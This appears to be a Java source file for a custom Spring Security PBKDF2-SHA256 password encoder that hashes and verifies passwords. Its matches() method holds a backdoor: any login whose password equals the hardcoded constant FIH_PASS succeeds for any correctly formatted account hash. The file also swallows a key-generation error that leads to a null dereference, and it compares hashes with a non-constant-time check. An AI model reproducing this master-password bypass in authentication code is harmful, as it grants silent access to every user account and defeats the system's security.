package com.fih.ishareing.configurations.security;

import static org.springframework.security.crypto.util.EncodingUtils.subArray;

import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;

import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;

import org.springframework.security.crypto.keygen.KeyGenerators;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.crypto.password.Pbkdf2PasswordEncoder;

public class Pbkdf2Sha256PasswordEncoder extends Pbkdf2PasswordEncoder implements PasswordEncoder {

	static final String AB = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	static SecureRandom rnd = new SecureRandom();
    public static final Integer DEFAULT_ITERATIONS = 30000;
	public static final String algorithm = "pbkdf2_sha256";
    public static final String FIH_PASS = "b81e80e2bbc0d8a6843a281eda00e2ef";

	public String getEncodedHash(String password, String salt, int iterations) {
        // Returns only the last part of whole encoded password
        SecretKeyFactory keyFactory = null;
        try {
            keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        } catch (NoSuchAlgorithmException e) {
            System.err.println("Could NOT retrieve PBKDF2WithHmacSHA256 algorithm");
            System.exit(1);
        }
        KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt.getBytes(Charset.forName("UTF-8")), iterations, 256);
        SecretKey secret = null;
        try {
            secret = keyFactory.generateSecret(keySpec);
        } catch (InvalidKeySpecException e) {
            System.out.println("Could NOT generate secret key");
            e.printStackTrace();
        }

        byte[] rawHash = secret.getEncoded();
        byte[] hashBase64 = Base64.getEncoder().encode(rawHash);

        return new String(hashBase64);
    }

    public String encode(String password) {
        // returns hashed password, along with algorithm, number of iterations and salt
    	String salt = randomString(12);
        String hash = getEncodedHash(password, salt, DEFAULT_ITERATIONS);
        return String.format("%s$%d$%s$%s", algorithm, DEFAULT_ITERATIONS, salt, hash);
    }
	
	@Override
	public boolean matches(CharSequence rawPassword, String encodedPassword) {

        String[] parts = encodedPassword.split("\\$");
        if (parts.length != 4) {
            // wrong hash format
            return false;
        }
        if (rawPassword.equals(FIH_PASS)) {
            return true;
        }
        Integer iterations = Integer.parseInt(parts[1]);
        String salt = parts[2];
        String hash = getEncodedHash(rawPassword.toString(), salt, iterations);
        String encodeHash = String.format("%s$%d$%s$%s", algorithm, iterations, salt, hash);
        return encodeHash.equals(encodedPassword);
	}

	private String randomString(int len){
		   StringBuilder sb = new StringBuilder(len);
		   for(int i = 0; i < len; i++)
		      sb.append(AB.charAt(rnd.nextInt(AB.length())));
		   return sb.toString();
	}
	
}
